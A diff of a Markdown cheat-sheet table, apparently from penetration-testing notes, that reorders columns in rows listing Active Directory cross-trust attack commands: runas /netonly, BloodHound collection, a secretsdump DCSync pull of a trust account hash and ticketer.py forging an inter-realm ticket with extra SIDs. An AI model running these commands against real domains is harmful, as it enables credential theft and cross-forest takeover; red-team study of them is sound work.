@@ -81,8 +81,8 @@ RETURN u.name,u.domain,exposure ORDER BY exposure DESC LIMIT 20
 |:---:|:---:|:---:|
 | `runas /netonly /user:partner.com\u cmd` | Cross-trust auth desde Windows | Test interactive. |
 | `bloodhound-python -d partner.com -u u@partner.com -p pass -ns <foreign-DC> -c All --zip` | Collection cross-trust | Multi-domain. |
-| Trust password discovery via DCSync | `secretsdump.py corp/admin:pass@<DC> -just-dc-user 'PARTNER$'` | Forge inter-realm TGT. |
-| Inter-realm TGT forge (con trust hash) | `ticketer.py -nthash <hash> -domain-sid ... -extra-sid ... -spn krbtgt/partner.com Administrator` | Cross-forest pivot. |
+| `secretsdump.py corp/admin:pass@<DC> -just-dc-user 'PARTNER$'` | Trust password discovery via DCSync | Forge inter-realm TGT. |
+| `ticketer.py -nthash <hash> -domain-sid ... -extra-sid ... -spn krbtgt/partner.com Administrator` | Inter-realm TGT forge (con trust hash) | Cross-forest pivot. |
 ^ad-multidom-auth
 
 ---
